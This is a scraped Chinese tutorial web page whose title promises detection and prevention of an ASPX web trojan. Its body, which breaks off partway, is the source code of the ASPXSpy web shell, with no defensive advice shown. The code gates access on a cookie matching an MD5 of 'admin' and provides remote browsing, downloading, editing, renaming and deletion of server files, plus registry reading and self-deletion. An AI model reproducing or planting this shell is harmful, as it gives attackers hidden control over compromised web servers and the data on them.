<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
    <title>aspx超强木马查杀与防范(web网马)_PHP教程_IDC笔记</title>
    <meta name="keywords" content="PHP,PHP笔记,PHP教程" />
    <meta name="description" content="复制代码 代码如下:&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; trace=&quot;false&quot; validateRequest=&quot;false&quot; EnableViewStateMac=&quot;false&quot; EnableViewState=&quot;true&quot;%&gt;&lt;%@ import Namesp" />
    <meta content="Responsive admin theme build on top of Bootstrap 4" name="description" />
    <meta content="idcnote.com" name="author" />
    <link rel="shortcut icon" href="/skin1/images/favicon.ico">
    <!--Morris Chart CSS -->
    <link rel="stylesheet" href="/skin1/css/morris.css">
    <link href="/skin1/css/bootstrap.min.css" rel="stylesheet" type="text/css">
    <link href="/skin1/css/metismenu.min.css" rel="stylesheet" type="text/css">
    <link href="/skin1/css/icons.css" rel="stylesheet" type="text/css">
    <link href="/skin1/css/style.css" rel="stylesheet" type="text/css">
<link href="/SyntaxHighlighter/shCoreDefault.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">
 SyntaxHighlighter.all();
</script>
<script>
var paras = document.getElementsByTagName("pre");
for ( var i=0;i<paras.length;i++ ) {
    paras[i].setAttribute("class","brush:php;toolbar:false");     
}
</script>
</head>
<body>
<!-- Begin page -->
		<div id="wrapper">
			<!-- Top Bar Start -->
			<div class="topbar">
				<!-- LOGO -->
				<div class="topbar-left">
					<a href="/" class="logo">
						<span class="logo-light">
                            <i class="mdi mdi-camera-control"></i>IDC笔记
                        </span>
						<span class="logo-sm">
                            <i class="mdi mdi-camera-control"></i>
                        </span>
					</a>
				</div>
				<nav class="navbar-custom">
					<ul class="navbar-right list-inline float-right mb-0">
						<!--<li class="dropdown notification-list list-inline-item d-none d-md-inline-block">
							<a class="nav-link waves-effect" href="#" id="btn-fullscreen">
								<i class="mdi mdi-arrow-expand-all noti-icon"></i>
							</a>
						</li>
						<li class="dropdown notification-list list-inline-item">
							<div class="dropdown notification-list nav-pro-img">
								<a class="dropdown-toggle nav-link arrow-none nav-user" data-toggle="dropdown" href="#" role="button" aria-haspopup="false" aria-expanded="false">
									<img src="/skin1/picture/user-4.jpg" alt="user" class="rounded-circle">
								</a>
								<div class="dropdown-menu dropdown-menu-right profile-dropdown ">
									<a class="dropdown-item" href="#">
										<i class="mdi mdi-account-circle"></i> Profile</a>
									<a class="dropdown-item" href="#">
										<i class="mdi mdi-wallet"></i> Wallet</a>
									<a class="dropdown-item d-block" href="#">
										<span class="badge badge-success float-right">11</span>
										<i class="mdi mdi-settings"></i> Settings</a>
									<a class="dropdown-item" href="#">
										<i class="mdi mdi-lock-open-outline"></i> Lock screen</a>
									<div class="dropdown-divider"></div>
									<a class="dropdown-item text-danger" href="#">
										<i class="mdi mdi-power text-danger"></i> Logout</a>
								</div>
							</div>
						</li>
						-->
					</ul>
					<ul class="list-inline menu-left mb-0">
						<li class="float-left">
							<button class="button-menu-mobile open-left waves-effect">
                            <i class="mdi mdi-menu"></i>
                        </button>
						</li>
						<li class="d-none d-md-inline-block">
							<form role="search" class="app-search">
								<div class="form-group mb-0">
									<input type="text" class="form-control" placeholder="Search..">
									<button type="submit"><i class="fa fa-search"></i></button>
								</div>
							</form>
						</li>
					</ul>
				</nav>
			</div>
<!-- ========== Left Sidebar Start ========== -->
<div class="left side-menu">
    <div class="slimscroll-menu" id="remove-scroll">
    <!--- Sidemenu -->
    <div id="sidebar-menu">
    <!-- Left Menu Start -->
    <ul class="metismenu" id="side-menu">
			<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP简介			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/jianjie/1.html">PHP简介</a></li><li><a href="/php/jianjie/2.html">PHP用途</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP基本语法			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/yufa/3.html">分离HTML</a></li><li><a href="/php/yufa/4.html">指令分隔符</a></li><li><a href="/php/yufa/5.html">PHP注释</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP类型			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/phpleixing/6.html">PHP类型简介</a></li><li><a href="/php/phpleixing/7.html">PHP类型之布尔类型</a></li><li><a href="/php/phpleixing/8.html">PHP类型之整型</a></li><li><a href="/php/phpleixing/9.html">PHP类型之浮点型</a></li><li><a href="/php/phpleixing/10.html">PHP类型之字符串</a></li><li><a href="/php/phpleixing/11.html">PHP类型之数组</a></li><li><a href="/php/phpleixing/12.html">PHP类型之对象</a></li><li><a href="/php/phpleixing/13.html">PHP类型之资源类型</a></li><li><a href="/php/phpleixing/14.html">PHP类型之NULL</a></li><li><a href="/php/phpleixing/15.html">PHP类型之伪类型</a></li><li><a href="/php/phpleixing/16.html">PHP类型之类型判别</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP变量			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/phpbianliang/17.html">PHP变量之基础</a></li><li><a href="/php/phpbianliang/18.html">PHP变量之预定义变量</a></li><li><a href="/php/phpbianliang/19.html">PHP变量之变量范围</a></li><li><a href="/php/phpbianliang/20.html">PHP变量之可变变量</a></li><li><a href="/php/phpbianliang/21.html">PHP变量之外部变量</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP运算符			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/yunsuanfu/22.html">PHP运算符优先级</a></li><li><a href="/php/yunsuanfu/23.html">算术运算符</a></li><li><a href="/php/yunsuanfu/24.html">赋值运算符</a></li><li><a href="/php/yunsuanfu/25.html">位运算符</a></li><li><a href="/php/yunsuanfu/26.html">比较运算符</a></li><li><a href="/php/yunsuanfu/27.html">错误控制运算符</a></li><li><a href="/php/yunsuanfu/28.html">执行运算符</a></li><li><a href="/php/yunsuanfu/29.html">递增/递减运算符</a></li><li><a href="/php/yunsuanfu/30.html">逻辑运算符</a></li><li><a href="/php/yunsuanfu/31.html">字符串运算符</a></li><li><a href="/php/yunsuanfu/32.html">数组运算符</a></li><li><a href="/php/yunsuanfu/33.html">类型运算符</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP控制结构			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/jiegou/34.html">PHP控制结构之if</a></li><li><a href="/php/jiegou/35.html">PHP控制结构之else</a></li><li><a href="/php/jiegou/36.html">PHP控制结构之elseif/else if</a></li><li><a href="/php/jiegou/37.html">PHP控制结构之替代语法</a></li><li><a href="/php/jiegou/38.html">PHP控制结构之while</a></li><li><a href="/php/jiegou/39.html">PHP控制结构之do-while</a></li><li><a href="/php/jiegou/40.html">PHP控制结构之for</a></li><li><a href="/php/jiegou/41.html">PHP控制结构之foreach</a></li><li><a href="/php/jiegou/42.html">PHP控制结构之break</a></li><li><a href="/php/jiegou/43.html">PHP控制结构之continue</a></li><li><a href="/php/jiegou/44.html">PHP控制结构之switch</a></li><li><a href="/php/jiegou/45.html">PHP控制结构之declare</a></li><li><a href="/php/jiegou/46.html">PHP控制结构之return</a></li><li><a href="/php/jiegou/47.html">PHP控制结构之require</a></li><li><a href="/php/jiegou/48.html">PHP控制结构之include</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP函数			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/hanshu/52.html">用户自定义函数</a></li><li><a href="/php/hanshu/53.html">函数的参数</a></li><li><a href="/php/hanshu/54.html">返回值</a></li><li><a href="/php/hanshu/55.html">可变函数</a></li><li><a href="/php/hanshu/56.html">内部（内置）函数</a></li><li><a href="/php/hanshu/57.html">匿名函数</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP类与对象			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/phpduixiang/58.html">类与对象前言</a></li><li><a href="/php/phpduixiang/59.html">基本概念</a></li><li><a href="/php/phpduixiang/60.html">属性</a></li><li><a href="/php/phpduixiang/61.html">类常量</a></li><li><a href="/php/phpduixiang/62.html">自动加载对象</a></li><li><a href="/php/phpduixiang/63.html">构造函数和析构函数</a></li><li><a href="/php/phpduixiang/64.html">访问控制</a></li><li><a href="/php/phpduixiang/65.html">对象继承</a></li><li><a href="/php/phpduixiang/66.html">Static关键字</a></li><li><a href="/php/phpduixiang/67.html">抽象类</a></li><li><a href="/php/phpduixiang/68.html">接口</a></li><li><a href="/php/phpduixiang/69.html">Traits</a></li><li><a href="/php/phpduixiang/70.html">重载</a></li><li><a href="/php/phpduixiang/71.html">对象迭代</a></li><li><a href="/php/phpduixiang/72.html">设计模式</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP异常处理			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/yichang/81.html">异常处理</a></li><li><a href="/php/yichang/82.html">扩展PHP内置的异常处理类</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP函数库按分类			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/phpku/83.html">数组</a></li><li><a href="/php/phpku/84.html">Classes/Objects</a></li><li><a href="/php/phpku/85.html">Date/Time</a></li><li><a href="/php/phpku/86.html">Directories</a></li><li><a href="/php/phpku/87.html">错误处理</a></li><li><a href="/php/phpku/88.html">Program execution</a></li><li><a href="/php/phpku/89.html">Filesystem</a></li><li><a href="/php/phpku/90.html">Filter</a></li><li><a href="/php/phpku/91.html">Function Handling</a></li><li><a href="/php/phpku/92.html">PHP 选项/信息</a></li><li><a href="/php/phpku/93.html">Mail</a></li><li><a href="/php/phpku/94.html">Math</a></li><li><a href="/php/phpku/95.html">Misc.</a></li><li><a href="/php/phpku/96.html">Network</a></li><li><a href="/php/phpku/97.html">输出控制</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> php基础			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/phpbiji/108377.html"></a></li><li><a href="/php/phpbiji/108376.html"></a></li><li><a href="/php/phpbiji/108380.html"></a></li><li><a href="/php/phpbiji/108379.html"></a></li><li><a href="/php/phpbiji/108378.html"></a></li><li><a href="/php/phpbiji/108381.html"></a></li><li><a href="/php/phpbiji/108382.html"></a></li><li><a href="/php/phpbiji/108384.html"></a></li><li><a href="/php/phpbiji/108383.html"></a></li><li><a href="/php/phpbiji/108385.html"></a></li><li><a href="/php/phpbiji/108386.html"></a></li><li><a href="/php/phpbiji/108388.html"></a></li><li><a href="/php/phpbiji/108387.html"></a></li><li><a href="/php/phpbiji/108389.html"></a></li><li><a href="/php/phpbiji/108391.html"></a></li>		</ul>
	</li>
		<li>
	    <a href="/php/biji/" class="waves-effect">
		    <i class="icon-share"></i>
		    <span>PHP笔记
		       	<span class="float-right menu-arrow">
		       	<i class="mdi mdi-chevron-right"></i>
		       	</span>
		    </span>
	    </a>
	</li>
	</ul>
</div>
<!-- Sidebar -->
<div class="clearfix"></div>
</div>
<!-- Sidebar -left -->
</div>
<!-- Left Sidebar End -->
<!-- Start right Content here -->
<div class="content-page">
	<div class="content">
		<div class="container-fluid">
			<div class="page-title-box">
				<div class="row align-items-center">
					<div class="col-sm-6">
						<h1 class="page-title">aspx超强木马查杀与防范(web网马)</h1>
					</div>
				</div>
				<!-- end row -->
			</div>
			<!-- end page-title -->
			<!-- START ROW -->
			<div class="panel panel-forbid">
				<div class="panel-title"><i class="fa fa fa-file-text fa-fw"></i>内容摘要</div>
			    <div class="panel-content">
			    <span>复制代码 代码如下:&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; trace=&quot;false&quot; validateRequest=&quot;false&quot; EnableViewStateMac=&quot;false&quot; EnableViewState=&quot;true&quot;%&gt;&lt;%@ import Namesp</span>                                     
		    	</div>
			    <div class="panel-title"><i class="fa fa fa-file-text fa-fw"></i>文章正文</div>
			    <div class="panel-content">
			    <span><P><div class="codetitle"><span><a style="CURSOR: pointer" data="46619" class="copybut" id="copybut46619" onclick="doCopy('code46619')"><U>复制代码</U></a></span> 代码如下:</div><div class="codebody" id="code46619"><BR>&lt;%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%&gt;<BR>&lt;%@ import Namespace="System.IO"%&gt;<BR>&lt;%@ import Namespace="System.Diagnostics"%&gt;<BR>&lt;%@ import Namespace="System.Data"%&gt;<BR>&lt;%@ import Namespace="System.Management"%&gt;<BR>&lt;%@ import Namespace="System.Data.OleDb"%&gt;<BR>&lt;%@ import Namespace="Microsoft.Win32"%&gt;<BR>&lt;%@ import Namespace="System.Net.Sockets" %&gt;<BR>&lt;%@ import Namespace="System.Net" %&gt;<BR>&lt;%@ import Namespace="System.Runtime.InteropServices"%&gt;<BR>&lt;%@ import Namespace="System.DirectoryServices"%&gt;<BR>&lt;%@ import Namespace="System.ServiceProcess"%&gt;<BR>&lt;%@ import Namespace="System.Text.RegularExpressions"%&gt;<BR>&lt;%@ Import Namespace="System.Threading"%&gt;<BR>&lt;%@ Import Namespace="System.Data.SqlClient"%&gt;<BR>&lt;%@ import Namespace="Microsoft.VisualBasic"%&gt;<BR>&lt;%@ Assembly Name="System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%&gt;<BR>&lt;%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%&gt;<BR>&lt;%@ Assembly Name="System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%&gt;<BR>&lt;%@ Assembly Name="Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a"%&gt;<BR>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;<BR>&lt;script runat="server"&gt;<BR>public string Password="21232f297a57a5a743894a0e4a801fc3";//admin<BR>public string vbhLn="ASPXSpy";<BR>public int TdgGU=1;<BR>protected OleDbConnection Dtdr=new OleDbConnection();<BR>protected OleDbCommand Kkvb=new OleDbCommand();<BR>public NetworkStream NS=null;<BR>public NetworkStream NS1=null;<BR>TcpClient tcp=new TcpClient();<BR>TcpClient zvxm=new TcpClient();<BR>ArrayList IVc=new ArrayList();<BR>protected void Page_load(object sender,EventArgs e)<BR>{<BR>YFcNP(this);<BR>fhAEn();<BR>if (!pdo())<BR>{<BR>return;<BR>}<BR>if(IsPostBack)<BR>{<BR>string tkI=Request["__EVENTTARGET"];<BR>string VqV=Request["__File"];<BR>if(tkI!="")<BR>{<BR>switch(tkI)<BR>{<BR>case "Bin_Parent":<BR>krIR(Ebgw(VqV));<BR>break;<BR>case "Bin_Listdir":<BR>krIR(Ebgw(VqV));<BR>break;<BR>case "kRXgt":<BR>kRXgt(Ebgw(VqV));<BR>break;<BR>case "Bin_Createfile":<BR>gLKc(VqV);<BR>break;<BR>case "Bin_Editfile":<BR>gLKc(VqV);<BR>break;<BR>case "Bin_Createdir":<BR>stNPw(VqV);<BR>break;<BR>case "cYAl":<BR>cYAl(VqV);<BR>break;<BR>case "ksGR":<BR>ksGR(Ebgw(VqV));<BR>break;<BR>case "SJv":<BR>SJv(VqV);<BR>break;<BR>case "Bin_Regread":<BR>tpRQ(Ebgw(VqV));<BR>break;<BR>case "hae":<BR>hae();<BR>break;<BR>case "urJG":<BR>urJG(VqV);<BR>break;<BR>}<BR>if(tkI.StartsWith("dAJTD"))<BR>{<BR>dAJTD(Ebgw(tkI.Replace("dAJTD","")),VqV);<BR>}<BR>else if(tkI.StartsWith("Tlvz"))<BR>{<BR>Tlvz(Ebgw(tkI.Replace("Tlvz","")),VqV);<BR>}<BR>else if(tkI.StartsWith("Bin_CFile"))<BR>{<BR>YByN(Ebgw(tkI.Replace("Bin_CFile","")),VqV);<BR>}<BR>}<BR>}<BR>else<BR>{<BR>PBZw();<BR>}<BR>}<BR>public bool pdo()<BR>{<BR>if(Request.Cookies[vbhLn]==null)<BR>{<BR>tZSx();<BR>return false;<BR>}<BR>else<BR>{<BR>if (Request.Cookies[vbhLn].Value != Password)<BR>{<BR>tZSx();<BR>return false;<BR>}<BR>else<BR>{<BR>return true;<BR>}<BR>}<BR>}<BR>public void tZSx()<BR>{<BR>ljtzC.Visible=true;<BR>ZVS.Visible=false;<BR>}<BR>protected void YKpI(object sender,EventArgs e)<BR>{<BR>Session.Abandon();<BR>Response.Cookies.Add(new HttpCookie(vbhLn,null));<BR>tZSx();<BR>}<BR>public void PBZw()<BR>{<BR>ZVS.Visible=true;<BR>ljtzC.Visible=false;<BR>Bin_Button_CreateFile.Attributes["onClick"]="var filename=prompt('Please input the file name:','');if(filename){Bin_PostBack('Bin_Createfile',filename);}";<BR>Bin_Button_CreateDir.Attributes["onClick"]="var filename=prompt('Please input the directory name:','');if(filename){Bin_PostBack('Bin_Createdir',filename);}";<BR>Bin_Button_KillMe.Attributes["onClick"]="if(confirm('确定要自杀?')){Bin_PostBack('hae','');};";<BR>Bin_Span_Sname.InnerHtml=Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"("+Request.ServerVariables["SERVER_NAME"]+")";<BR>Bin_Span_FrameVersion.InnerHtml="Framework Ver : "+Environment.Version.ToString();<BR>if (AXSbb.Value==string.Empty)<BR>{<BR>AXSbb.Value=OElM(Server.MapPath("."));<BR>}<BR>Bin_H2_Title.InnerText="文件(夹)管理 &gt;&gt;";<BR>krIR(AXSbb.Value);<BR>}<BR>public void fhAEn()<BR>{<BR>try<BR>{<BR>string[] YRgt=Directory.GetLogicalDrives();<BR>for(int i=0;i&lt;YRgt.Length;i++)<BR>{<BR>Control c=ParseControl(" &lt;asp:LinkButton Text='"+mFvj(YRgt[i])+"' ID=\"Bin_Button_Driv"+i+"\" runat='server' commandargument= '"+YRgt[i]+"'/&gt; | ");<BR>Bin_Span_Drv.Controls.Add(c);<BR>LinkButton nxeDR=(LinkButton)Page.FindControl("Bin_Button_Driv"+i);<BR>nxeDR.Command+=new CommandEventHandler(this.iVk);<BR>}<BR>}catch(Exception ex){}<BR>}<BR>public string OElM(string path)<BR>{<BR>if(path.Substring(path.Length-1,1)!=@"\")<BR>{<BR>path=path+@"\";<BR>}<BR>return path;<BR>}<BR>public string nrrx(string path)<BR>{<BR>char[] trim={'\\'};<BR>if(path.Substring(path.Length-1,1)==@"\")<BR>{<BR>path=path.TrimEnd(trim);<BR>}<BR>return path;<BR>}<BR>[DllImport("kernel32.dll",EntryPoint="GetDriveTypeA")]<BR>public static extern int OMZP(string nDrive);<BR>public string mFvj(string instr)<BR>{<BR>string EuXD=string.Empty;<BR>int num=OMZP(instr);<BR>switch(num)<BR>{<BR>case 1:<BR>EuXD="Unknow("+instr+")";<BR>break;<BR>case 2:<BR>EuXD="Removable("+instr+")";<BR>break;<BR>case 3:<BR>EuXD="磁盘("+instr+")";<BR>break;<BR>case 4:<BR>EuXD="Network("+instr+")";<BR>break;<BR>case 5:<BR>EuXD="CDRom("+instr+")";<BR>break;<BR>case 6:<BR>EuXD="RAM Disk("+instr+")";<BR>break;<BR>}<BR>return EuXD.Replace(@"\","");<BR>}<BR>public string MVVJ(string instr)<BR>{<BR>byte[] tmp=Encoding.Default.GetBytes(instr);<BR>return Convert.ToBase64String(tmp);<BR>}<BR>public string Ebgw(string instr)<BR>{<BR>byte[] tmp=Convert.FromBase64String(instr);<BR>return Encoding.Default.GetString(tmp);<BR>}<BR>public void krIR(string path)<BR>{<BR>WICxe();<BR>CzfO.Visible=true;<BR>Bin_H2_Title.InnerText="文件(夹)管理 &gt;&gt;";<BR>AXSbb.Value=OElM(path);<BR>DirectoryInfo GQMM=new DirectoryInfo(path);<BR>if(Directory.GetParent(nrrx(path))!=null)<BR>{<BR>string bg=OKM();<BR>TableRow p=new TableRow();<BR>for(int i=1;i&lt;6;i++)<BR>{<BR>TableCell pc=new TableCell();<BR>if(i==1)<BR>{<BR>pc.Width=Unit.Parse("2%");<BR>pc.Text="&lt;font face='wingdings' size='4'&gt;0&lt;/font&gt;";<BR>p.CssClass=bg;<BR>}<BR>if(i==2)<BR>{<BR>pc.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Parent','"+MVVJ(Directory.GetParent(nrrx(path)).ToString())+"')\"&gt;Parent Directory&lt;/a&gt;";<BR>}<BR>p.Cells.Add(pc);<BR>UGzP.Rows.Add(p);<BR>}<BR>}<BR>try<BR>{<BR>int vLlH=0;<BR>foreach(DirectoryInfo Bin_folder in GQMM.GetDirectories())<BR>{<BR>string bg=OKM();<BR>vLlH++;<BR>TableRow tr=new TableRow();<BR>TableCell tc=new TableCell();<BR>tc.Width=Unit.Parse("2%");<BR>tc.Text="&lt;font face='wingdings' size='4'&gt;0&lt;/font&gt;";<BR>tr.Attributes["onmouseover"]="this.className='focus';";<BR>tr.CssClass=bg;<BR>tr.Attributes["onmouseout"]="this.className='"+bg+"';";<BR>tr.Cells.Add(tc);<BR>TableCell HczyN=new TableCell();<BR>HczyN.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Listdir','"+MVVJ(AXSbb.Value+Bin_folder.Name)+"')\"&gt;"+Bin_folder.Name+"&lt;/a&gt;";<BR>tr.Cells.Add(HczyN);<BR>TableCell LYZK=new TableCell();<BR>LYZK.Text=Bin_folder.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");<BR>tr.Cells.Add(LYZK);<BR>UGzP.Rows.Add(tr);<BR>TableCell ERUL=new TableCell();<BR>ERUL.Text="--";<BR>tr.Cells.Add(ERUL);<BR>UGzP.Rows.Add(tr);<BR>TableCell ZGKh=new TableCell();<BR>ZGKh.Text="&lt;a href=\"javascript:if(confirm('确定要删除此文件(夹) ?')){Bin_PostBack('kRXgt','"+MVVJ(AXSbb.Value+Bin_folder.Name)+"')};\"&gt;删除&lt;/a&gt; | &lt;a href='#' onclick=\"var filename=prompt('请输入文件夹名称:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_folder.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('dAJTD"+MVVJ(AXSbb.Value+Bin_folder.Name)+"',filename);} \"&gt;重命名&lt;/a&gt;";<BR>tr.Cells.Add(ZGKh);<BR>UGzP.Rows.Add(tr);<BR>}<BR>TableRow cKVA=new TableRow();<BR>cKVA.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";<BR>cKVA.Attributes["bgcolor"]="#dddddd";<BR>TableCell JlmW=new TableCell();<BR>JlmW.Attributes["colspan"]="6" ;<BR>JlmW.Attributes["height"]="5";<BR>cKVA.Cells.Add(JlmW);<BR>UGzP.Rows.Add(cKVA);<BR>int aYRwo=0;<BR>foreach(FileInfo Bin_Files in GQMM.GetFiles())<BR>{<BR>aYRwo++;<BR>string gb=OKM();<BR>TableRow tr=new TableRow();<BR>TableCell tc=new TableCell();<BR>tc.Width=Unit.Parse("2%");<BR>tc.Text="&lt;input type=\"checkbox\" value=\"0\" name=\""+MVVJ(Bin_Files.Name)+"\"&gt;";<BR>tr.Attributes["onmouseover"]="this.className='focus';";<BR>tr.CssClass=gb;<BR>tr.Attributes["onmouseout"]="this.className='"+gb+"';";<BR>tr.Cells.Add(tc);<BR>TableCell filename=new TableCell();<BR>if(Bin_Files.FullName.StartsWith(Request.PhysicalApplicationPath))<BR>{<BR>string url=Request.Url.ToString();<BR>filename.Text="&lt;a href=\""+Bin_Files.FullName.Replace(Request.PhysicalApplicationPath,url.Substring(0,url.IndexOf('/',8)+1)).Replace("\\","/")+"\" target=\"_blank\"&gt;"+Bin_Files.Name+"&lt;/a&gt;";<BR>}<BR>else<BR>{<BR>filename.Text=Bin_Files.Name;<BR>}<BR>TableCell albt=new TableCell();<BR>albt.Text=Bin_Files.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");<BR>TableCell YzK=new TableCell();<BR>YzK.Text=mTG(Bin_Files.Length);<BR>TableCell GLpi=new TableCell();<BR>GLpi.Text="&lt;a href=\"#\" onclick=\"Bin_PostBack('ksGR','"+MVVJ(AXSbb.Value+Bin_Files.Name)+"')\"&gt;下载&lt;/a&gt; | &lt;a href='#' onclick=\"var filename=prompt('请输入新的文件名:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Bin_CFile"+MVVJ(AXSbb.Value+Bin_Files.Name)+"',filename);} \"&gt;复制&lt;/a&gt; | &lt;a href=\"#\" onclick=\"Bin_PostBack('Bin_Editfile','"+Bin_Files.Name+"')\"&gt;编辑&lt;/a&gt; | &lt;a href='#' onclick=\"var filename=prompt('请输入新的文件名:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Tlvz"+MVVJ(AXSbb.Value+Bin_Files.Name)+"',filename);} \"&gt;重命名&lt;/a&gt; | &lt;a href=\"#\" onclick=\"Bin_PostBack('cYAl','"+Bin_Files.Name+"')\"&gt;修改文件属性&lt;/a&gt; ";<BR>tr.Cells.Add(filename);<BR>tr.Cells.Add(albt);<BR>tr.Cells.Add(YzK);<BR>tr.Cells.Add(GLpi);<BR>UGzP.Rows.Add(tr);<BR>}<BR>string lgb=OKM();<BR>TableRow oWam=new TableRow();<BR>oWam.CssClass=lgb;<BR>for(int i=1;i&lt;4;i++)<BR>{<BR>TableCell lGV=new TableCell();<BR>if(i==1)<BR>{<BR>lGV.Text="&lt;input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"var ck=document.getElementsByTagName('input');for(var i=0;i&lt;ck.length-1;i++){if(ck[i].type=='checkbox'&&ck[i].name!='chkall'){ck[i].checked=forms[0].chkall.checked;}}\"/&gt;";<BR>}<BR>if(i==2)<BR>{<BR>lGV.Text="&lt;a href=\"#\" Onclick=\"var d_file='';var ck=document.getElementsByTagName('input');for(var i=0;i&lt;ck.length-1;i++){if(ck[i].checked&&ck[i].name!='chkall'){d_file+=ck[i].name+',';}};if(d_file==null || d_file==''){ return;} else {if(confirm('Are you sure delete the files ?')){Bin_PostBack('SJv',d_file)};}\"&gt;Delete selected&lt;/a&gt;";<BR>}<BR>if(i==3)<BR>{<BR>lGV.ColumnSpan=4;<BR>lGV.Style.Add("text-align","right");<BR>lGV.Text=vLlH+" 文件夹/ "+aYRwo+" 文件";<BR>}<BR>oWam.Cells.Add(lGV);<BR>}<BR>UGzP.Rows.Add(oWam);<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>}<BR>public string OKM()<BR>{<BR>TdgGU++;<BR>if(TdgGU % 2==0)<BR>{<BR>return "alt1";<BR>}<BR>else<BR>{<BR>return "alt2";<BR>}<BR>}<BR>public void kRXgt(string qcKu)<BR>{<BR>try<BR>{<BR>Directory.Delete(qcKu,true);<BR>xseuB("Directory delete new success !");<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>krIR(Directory.GetParent(qcKu).ToString());<BR>}<BR>public void dAJTD(string sdir,string ddir)<BR>{<BR>try<BR>{<BR>Directory.Move(sdir,ddir);<BR>xseuB("Directory Renamed Success !");<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>krIR(AXSbb.Value);<BR>}<BR>public void Tlvz(string sfile,string dfile)<BR>{<BR>try<BR>{<BR>File.Move(sfile,dfile);<BR>xseuB("File Renamed Success !");<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>krIR(AXSbb.Value);<BR>}<BR>public void YByN(string spath,string dpath)<BR>{<BR>try<BR>{<BR>File.Copy(spath,dpath);<BR>xseuB("File Copy Success !");<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>krIR(AXSbb.Value);<BR>}<BR>public void stNPw(string path)<BR>{<BR>try<BR>{<BR>Directory.CreateDirectory(AXSbb.Value+path);<BR>xseuB("Directory 